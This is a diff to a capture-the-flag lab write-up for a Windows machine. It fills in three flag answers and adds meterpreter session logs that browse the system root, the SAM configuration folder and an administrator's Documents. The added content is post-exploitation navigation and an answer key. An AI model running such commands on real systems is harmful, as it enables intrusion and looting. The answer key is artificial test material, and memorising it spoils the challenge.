@@ -4,10 +4,40 @@ Flag1? This flag can be found at the system root.
 --> flag{access_the_machine}
 
 Flag2? This flag can be found at the location where passwords are stored within Windows.
--->
+--> flag{sam_database_elevated_access}
 
 *Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. 
 Flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
--->
+-->flag{admin_documents_can_be_valuable}
 
 */............................................................................................................................................./*
+For flag1:
+meterpreter > pwd
+C:\\Windows\system32
+meterpreter > cd C:/
+meterpreter > dir
+
+
+meterpreter > cat flag1.txt
+flag{access_the_machine}
+_________________________________________________________________________________________________________
+For flag2:
+meterpreter > cd C:/Windows/System32/config
+meterpreter > dir
+
+
+meterpreter > cat flag2.txt
+flag{sam_database_elevated_access}
+_________________________________________________________________________________________________________
+For flag3:
+meterpreter > search -h
+
+
+meterpreter > search -f flag*.txt
+
+
+meterpreter > C:\\Users\\Jon\\Documents\\flag3.txt
+flag{admin_documents_can_be_valuable}
+
+*/............................................................................................................................................./*
+
